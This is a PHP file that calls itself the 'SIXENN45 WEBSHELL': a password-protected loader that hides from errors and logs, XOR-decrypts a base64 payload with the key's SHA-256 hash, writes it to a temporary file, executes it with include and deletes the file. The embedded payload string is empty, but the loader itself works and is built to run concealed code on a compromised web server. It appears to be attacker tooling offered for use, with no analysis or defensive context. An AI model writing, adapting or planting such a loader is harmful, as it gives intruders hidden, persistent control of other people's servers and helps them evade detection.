<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);


// PLER: hash('sha256', input) === hash_sha256
$hash_sha256 = '908d6f7546387f24934e1f48b28941872264f6719cb940cc43b0cc439a1edcbe';
$data = '';

if (!isset($_SESSION['unlock'])) {
    $input = $_POST['k'] ?? '';
    // SIXENN45
    if (hash('sha256', $input) === $hash_sha256) {
        // SIXENN45
        $k = $hash_sha256;
        $d = base64_decode($data);
        $s = '';
        for ($i = 0; $i < strlen($d); $i++) {
            $s .= $d[$i] ^ $k[$i % strlen($k)];
        }
        $_SESSION['s'] = $s;
        $_SESSION['unlock'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        echo '<!DOCTYPE html><html><head><title>SIXENN45 WEBSHELL</title><style>
        body{background:#0a0a0a;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .box{background:#111;padding:40px;border:1px solid #0f0;border-radius:10px;text-align:center}
        input{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:12px;width:100%;border-radius:5px;margin-bottom:10px;font-size:16px}
        button{background:#0f0;color:#000;border:none;padding:12px;font-weight:bold;cursor:pointer;border-radius:5px;width:100%;font-size:16px}
        .e{color:#f00;font-size:12px}
        </style></head><body><div class="box"><h1>MASUKAN KUNCI</h1>';
        if (isset($_POST['k'])) echo '<div class="e">SALAH!</div>';
        echo '<form method="post"><input type="password" name="k" placeholder="Key" autofocus><br><button type="submit">Unlock</button></form></div></body></html>';
        exit;
    }
}

$s = $_SESSION['s'] ?? '';
if (empty($s)) { session_destroy(); header('Location: ' . $_SERVER['PHP_SELF']); exit; }

$tmp = tempnam(sys_get_temp_dir(), 'sh');
file_put_contents($tmp, $s);
include($tmp);
unlink($tmp);
?>